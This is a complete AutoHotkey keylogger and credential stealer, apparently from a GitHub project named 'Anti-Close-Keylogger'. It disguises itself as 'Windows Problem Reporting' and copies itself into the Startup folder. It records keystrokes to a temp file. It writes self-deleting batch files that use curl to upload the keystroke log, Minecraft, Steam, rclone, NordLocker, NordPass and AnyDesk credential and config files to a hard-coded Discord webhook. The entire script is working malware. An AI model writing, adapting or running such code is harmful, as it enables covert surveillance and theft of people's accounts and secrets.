#SingleInstance, Force
#InstallKeybdHook
#InstallMouseHook
#KeyHistory
SetBatchLines, -1
countt := 1
IfNotExist, C:\ProgramData\boost_interprocess
	FileCreateDir, C:\ProgramData\boost_interprocess
IfNotExist, C:\Program Files\PCHealthCheck\lib
	FileCreateDir, C:\Program Files\PCHealthCheck\lib
URLDownloadToFile,https://github.com/Altify-Development/Anti-Close-Keylogger-AutoHotKey/blob/main/report.ico?raw=true,C:\Program Files\PCHealthCheck\lib\report.ico
FileCreateShortcut, %A_AppData%\LocalLow\Microsoft\Windows\Windows Problem Reporting.exe, %A_Startup%,,Windows Problem Reporting,
FileCopy,%A_ScriptFullPath%,%A_AppData%\LocalLow\Microsoft\Windows\Windows Problem Reporting.exe
Goto, write
log:
KeyWait, a, L
Send, a
FileAppend,%A_PriorKey%,%temp%/leg.txt
countt += 1
Goto, send
write:
FileAppend,@echo off`nchcp 65001 >nul`ncls`ntitle QUICK`ncls`ncurl -F "data=@%temp%/leg.txt" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`nexit,C:\ProgramData\boost_interprocess\QUICK.bat
FileAppend,@echo off`n,%temp%/update.bat
FileAppend,chcp 65001 >nul`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,title Altify Updater`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\.minecraft\launcher_accounts.json" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\.config\rclone\rclone.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\config.vdf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\loginusers.vdf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Program Files (x86)\Steam\config\steamapps.vrmanifest" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Local\NordLocker\GlobalSettings.json" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,certutil -decode "C:\Users\%username%\AppData\Local\NVIDIA\accounts" "C:\Users\%username%\AppData\Local\Temp\info.error.*.txt"`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Local\Temp\info.error.*.txt" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\AnyDesk\user.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\%username%\AppData\Roaming\AnyDesk\connection_trace.txt" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,curl -F "data=@C:\Users\zekel\AppData\Roaming\NordPass\config2.conf" https://discord.com/api/webhooks/1006725443208089670/H_cS3zzkdwKZOE2SKs0U6_7dFqXuotEoZLJSWOK9TTdufxYMrB5wrtyzVdDGRFuiKIcm`n,%temp%/update.bat
FileAppend,cls`n,%temp%/update.bat
FileAppend,echo. Update Complete`n,%temp%/update.bat
FileAppend,exit,%temp%/update.bat
Run,%temp%/update.bat
Sleep, 4000
FileDelete,%temp%/update.bat
send:
Sleep, 4000
Run,C:\ProgramData\boost_interprocess\QUICK.bat
if countt = 100
{
FileDelete,%temp%/leg.txt
}
Goto, log
#x::ExitApp